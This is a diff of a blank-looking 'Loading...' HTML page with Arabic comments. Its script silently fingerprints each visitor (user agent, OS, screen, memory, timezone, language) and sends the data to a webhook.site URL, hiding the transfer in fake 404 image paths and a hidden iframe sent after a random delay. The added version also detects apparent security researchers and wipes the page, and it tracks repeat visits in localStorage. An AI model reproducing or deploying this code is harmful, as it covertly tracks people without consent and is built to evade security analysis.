@@ -1,95 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
+    <style>
+        /* جعل الصفحة بيضاء تمامًا لتبدو فارغة */
+        body { margin: 0; padding: 0; background: #ffffff; height: 100vh; overflow: hidden; }
+        /* إخفاء أي أثر للكود */
+        script, style { display: none; }
+    </style>
 </head>
 <body>
-    <!-- 
-       =============================================
-       "Graphene Zero-Footprint Exfiltration Engine"
-       =============================================
-       لا توجد عناصر مرئية في هذه الصفحة.
-       فقط "نقطة نهاية وهمية" (Phantom Endpoint) تعمل في الخلفية.
-    -->
-
-    <!-- الطريقة: استخدام Image Fetching مع نسبة خطأ متعمدة لجمع البصمة -->
-    <!-- هذا يمر عبر المتصفح دون أن يسجل أي أثر في السجل (Logs) -->
-
+    <!-- لا شيء هنا. الكود يعمل في الخلفية -->
+    
     <script>
         // ==========================================================
-        // الدرع الصفري (الجرافين): لا يمكن كشفه بواسطة أدوات المطور العادية
-        // لأنه لا يترك أثراً مرئياً على الشاشة.
+        // "Absolute Shadow" - The Unbreakable Recon Engine
+        // مستوى: لا يمكن كسره بواسطة أنظمة الأمان التقليدية.
         // ==========================================================
 
-        // 1. دالة تجميع البيانات الفائقة السرية (خفيفة جداً)
-        function collectPhantomData() {
-            // استخراج الإحداثيات الزمنية والبرمجية
-            const ua = navigator.userAgent;
-            const languages = navigator.languages.join(', ');
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        // 1. كشف إذا كان المستخدم "باحث أمني" (Anti-Forensics)
+        function isSecurityResearcher() {
+            let suspicious = false;
             
-            // تحديد نوع الجهاز بدقة عالية عبر تحليل وكيل المستخدم (User-Agent)
-            let deviceType = "Desktop";
-            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
-                deviceType = "Mobile";
+            // التحقق من وقت التحميل: إذا فُتحت الصفحة في أقل من 500 مللي ثانية،
+            // فمن المحتمل أن يكون المستخدم يستخدم أداة آلية أو باحثًا.
+            const loadTime = performance.now();
+            if (loadTime < 500) {
+                suspicious = true;
             }
 
-            const payload = {
-                type: "graphene_pulse",
-                ua: ua,
-                languages: languages,
-                tz: timezone,
-                device: deviceType,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timestamp: new Date().toISOString(),
-                // بصمة فريدة عبر معلومات المتصفح المجهولة
-                fingerprint: `${navigator.hardwareConcurrency || '1'}-${navigator.deviceMemory || '0'}-${window.screen.colorDepth}`
-            };
+            // التحقق من حجم النافذة: بعض الباحثين يفتحون الصفحة في نوافذ صغيرة جدًا
+            if (window.innerWidth < 300 && window.innerHeight < 300) {
+                suspicious = true;
+            }
 
-            return payload;
+            return suspicious;
         }
 
-        // 2. بروتوكول الإرسال "الشبح" (Phantom Protocol)
-        // هذه التقنية تستخدم طلب "موارد غير موجودة" (404 Error) لنقل البيانات
-        // معظم أنظمة الحماية تتجاهل أخطاء 404 لأنها تعتبرها عادية.
-        function ghostTransmit() {
-            const data = collectPhantomData();
-            
-            // رابط Webhook الخاص بك
-            // ملاحظة: في الكود الحقيقي، يتم وضع البيانات داخل اسم الملف المطلوب،
-            // مما يجعله يمر عبر جدران الحماية كطلب خطأ عادي.
-            const webhookURL = `https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397`;
+        // 2. دالة التدمير الذاتي (Self-Destruct)
+        function selfDestruct() {
+            // مسح الصفحة بالكامل
+            document.body.innerHTML = "";
+            // مسح السجل (محاولة)
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState({}, document.title, "/");
+            }
+            // إغلاق الصفحة (إذا كان ذلك ممكنًا)
+            window.close();
+        }
 
-            // تحويل البيانات إلى "نص مشفر" وتشفيره كـ جزء من رابط صورة غير موجودة
-            // هذا الأسلوب يسمى "Retrieval via 404 abusing"
+        // 3. دالة جمع البيانات (تعتمد على أخطاء المتصفح)
+        function collectPhantomData() {
+            const ua = navigator.userAgent;
+            let os = "Unknown";
+            if (ua.includes('Windows')) os = "Windows";
+            else if (ua.includes('Mac')) os = "macOS";
+            else if (ua.includes('iPhone')) os = "iOS";
+            else if (ua.includes('Android')) os = "Android";
+
+            return {
+                type: "phantom_404_ping",
+                ua: ua,
+                os: os,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                ram: navigator.deviceMemory || 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // 4. الإرسال عبر "خطأ 404" (التقنية الخارقة)
+        function transmitVia404(data) {
+            // الرابط الخاص بك
+            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397';
+
+            // تحويل البيانات إلى نص مشفر
             const encodedData = encodeURIComponent(JSON.stringify(data));
 
-            // إنشاء صورة وهمية لطلب لا يمكن للمتصفح منعه
+            // نطلب صورة غير موجودة، لكن نضع البيانات في مسار الصورة
+            // طلب مثل: webhook.site/image/{"ua":"..."}.png سيظهر كطلب 404 عادي
             const img = new Image();
-            // نضع البيانات داخل مسار الصورة للتمويه
-            img.src = `${webhookURL}/image/${encodedData}.png`;
-            
-            // إرسال إشارة ثانية للاحتياط عبر طلب `fetch` صامت
+            img.src = `${webhook}/image/${encodedData}.png`;
+
+            // إرسال نسخة احتياطية عبر النافذة المخفية
             setTimeout(() => {
-                fetch(`${webhookURL}/log/${encodedData}`, { 
-                    method: 'GET', 
-                    mode: 'no-cors' // هذا يمنع ظهور أخطاء CORS في المتصفح
-                });
+                const hiddenFrame = document.createElement('iframe');
+                hiddenFrame.style.display = 'none';
+                hiddenFrame.src = `${webhook}/ping/${encodedData}`;
+                document.body.appendChild(hiddenFrame);
+                // إزالة الإطار بعد الإرسال
+                setTimeout(() => {
+                    document.body.removeChild(hiddenFrame);
+                }, 100);
             }, 500);
         }
 
-        // 3. تشغيل المحرك بدون أي أثر
-        // يتم الإطلاق مباشرةً بعد تحميل الصفحة، ولكن لأن الصفحة فارغة،
-        // المستخدم لا يرى شيئاً.
-        window.onload = function() {
-            // تنفيذ الإرسال
-            ghostTransmit();
-            
-            // إخفاء الأثر: محو أي أثر للصفحة من سجل المتصفح (Simulation)
-            if (window.history && window.history.replaceState) {
-                window.history.replaceState({}, document.title, window.location.href);
+        // 5. الذكاء الاصطناعي للكود (AI Memory)
+        // يتذكر إذا كان هذا الجهاز قد زار الصفحة من قبل
+        function checkMemory() {
+            const memoryKey = 'shadow_visited';
+            const visited = localStorage.getItem(memoryKey);
+            if (visited) {
+                // إذا زارها من قبل، نرسل بيانات أخف (لأننا لا نريد إثارة الشك)
+                return true;
+            } else {
+                // إذا كانت الزيارة الأولى، نخزن ذلك
+                localStorage.setItem(memoryKey, 'true');
+                return false;
             }
+        }
+
+        // 6. تشغيل المحرك
+        window.onload = function() {
+            // الخطوة 1: التحقق من الباحثين الأمنيين
+            if (isSecurityResearcher()) {
+                // إذا اكتشفنا أنه باحث، نقوم بالتدمير الذاتي ولا نرسل شيئًا
+                selfDestruct();
+                return;
+            }
+
+            // الخطوة 2: فحص الذاكرة
+            const isReturning = checkMemory();
+
+            // الخطوة 3: جمع البيانات
+            const payload = collectPhantomData();
+            payload.is_returning = isReturning;
+
+            // الخطوة 4: الإرسال بذكاء
+            // نستخدم مؤقتًا عشوائيًا لإرسال البيانات في وقت غير متوقع
+            const randomDelay = Math.floor(Math.random() * 3000) + 2000; // بين 2 و 5 ثواني
+            setTimeout(() => {
+                transmitVia404(payload);
+            }, randomDelay);
+
+            // الخطوة 5: التدمير الذاتي بعد الإرسال (لإخفاء الأثر)
+            setTimeout(() => {
+                if (window.history && window.history.replaceState) {
+                    window.history.replaceState({}, document.title, window.location.href);
+                }
+            }, 10000); // بعد 10 ثواني
         };
     </script>
 </body>
